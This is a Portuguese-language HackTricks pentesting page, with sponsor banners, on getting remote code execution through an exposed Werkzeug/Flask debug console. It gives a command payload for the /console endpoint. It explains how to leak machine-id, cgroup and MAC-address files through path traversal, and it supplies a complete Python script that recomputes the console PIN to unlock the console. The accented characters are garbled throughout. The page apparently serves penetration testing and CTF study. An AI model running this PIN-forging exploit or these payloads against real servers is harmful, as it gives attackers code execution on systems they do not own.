# Werkzeug / Flask Debug

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Configura√ß√£o instantaneamente dispon√≠vel para avalia√ß√£o de vulnerabilidades e teste de penetra√ß√£o**. Execute um pentest completo de qualquer lugar com mais de 20 ferramentas e recursos que v√£o desde a reconstru√ß√£o at√© a gera√ß√£o de relat√≥rios. N√£o substitu√≠mos os pentesters - desenvolvemos ferramentas personalizadas, m√≥dulos de detec√ß√£o e explora√ß√£o para dar a eles mais tempo para aprofundar, abrir shells e se divertir.

{% embed url="https://pentest-tools.com/" %}

## Console RCE

Se o debug estiver ativo, voc√™ pode tentar acessar `/console` e obter RCE.
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (317).png>)

Tamb√©m existem v√°rios exploits na internet como [este](https://github.com/its-arun/Werkzeug-Debug-RCE) ou um no metasploit.

## Protegido por PIN - Traversal de Caminho

Em algumas ocasi√µes, o endpoint **`/console`** ser√° protegido por um PIN. Se voc√™ tiver uma **vulnerabilidade de travessia de arquivo**, pode vazar todas as informa√ß√µes necess√°rias para gerar esse PIN.

### Explora√ß√£o de PIN do Console Werkzeug

For√ßar uma p√°gina de erro de depura√ß√£o no aplicativo para ver isso:
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
Um cen√°rio de "console bloqueado" √© encontrado ao tentar acessar a interface de depura√ß√£o do Werkzeug, indicando a necessidade de um PIN para desbloquear o console. A sugest√£o √© explorar o PIN do console analisando o algoritmo de gera√ß√£o de PIN no arquivo de inicializa√ß√£o de depura√ß√£o do Werkzeug (`__init__.py`). O mecanismo de gera√ß√£o de PIN pode ser estudado no [**reposit√≥rio de c√≥digo-fonte do Werkzeug**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py), embora seja aconselh√°vel obter o c√≥digo real do servidor por meio de uma vulnerabilidade de travessia de arquivos devido a poss√≠veis discrep√¢ncias de vers√£o.

Para explorar o PIN do console, s√£o necess√°rios dois conjuntos de vari√°veis, `probably_public_bits` e `private_bits`:

#### **`probably_public_bits`**

* **`username`**: Refere-se ao usu√°rio que iniciou a sess√£o do Flask.
* **`modname`**: Geralmente designado como `flask.app`.
* **`getattr(app, '__name__', getattr(app.__class__, '__name__'))`**: Geralmente resolve para **Flask**.
* **`getattr(mod, '__file__', None)`**: Representa o caminho completo para `app.py` dentro do diret√≥rio do Flask (por exemplo, `/usr/local/lib/python3.5/dist-packages/flask/app.py`). Se `app.py` n√£o for aplic√°vel, **tente `app.pyc`**.

#### **`private_bits`**

* **`uuid.getnode()`**: Obt√©m o endere√ßo MAC da m√°quina atual, com `str(uuid.getnode())` traduzindo-o para um formato decimal.
* Para **determinar o endere√ßo MAC do servidor**, √© necess√°rio identificar a interface de rede ativa usada pelo aplicativo (por exemplo, `ens3`). Em casos de incerteza, **vaze `/proc/net/arp`** para encontrar o ID do dispositivo, em seguida, **extraia o endere√ßo MAC** de **`/sys/class/net/<id do dispositivo>/address`**.
*   A convers√£o de um endere√ßo MAC hexadecimal para decimal pode ser realizada conforme mostrado abaixo:

```python
# Exemplo de endere√ßo MAC: 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```
* **`get_machine_id()`**: Concatena dados de `/etc/machine-id` ou `/proc/sys/kernel/random/boot_id` com a primeira linha de `/proc/self/cgroup` ap√≥s a √∫ltima barra (`/`).

<details>

<summary>C√≥digo para `get_machine_id()`</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</details>

Ap√≥s reunir todos os dados necess√°rios, o script de exploit pode ser executado para gerar o PIN do console Werkzeug. O script utiliza os `probably_public_bits` e `private_bits` montados para criar um hash, que ent√£o passa por um processamento adicional para produzir o PIN final. Abaixo est√° o c√≥digo Python para executar esse processo:
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',  # username
'flask.app',  # modname
'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
Este script produz o PIN ao fazer hash dos bits concatenados, adicionando sais espec√≠ficos (`cookiesalt` e `pinsalt`), e formatando a sa√≠da. √â importante observar que os valores reais de `probably_public_bits` e `private_bits` precisam ser obtidos com precis√£o do sistema alvo para garantir que o PIN gerado corresponda ao esperado pelo console Werkzeug.

{% hint style="success" %}
Se voc√™ estiver em uma **vers√£o antiga** do Werkzeug, tente mudar o **algoritmo de hash para md5** em vez de sha1.
{% endhint %}

## Refer√™ncias

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)

<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

**Configura√ß√£o instantaneamente dispon√≠vel para avalia√ß√£o de vulnerabilidades e teste de penetra√ß√£o**. Execute um pentest completo de qualquer lugar com mais de 20 ferramentas e recursos que v√£o desde a reconstru√ß√£o at√© a gera√ß√£o de relat√≥rios. N√£o substitu√≠mos os pentesters - desenvolvemos ferramentas personalizadas, m√≥dulos de detec√ß√£o e explora√ß√£o para dar a eles mais tempo para aprofundar, abrir shells e se divertir.

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>Aprenda hacking na AWS de zero a her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
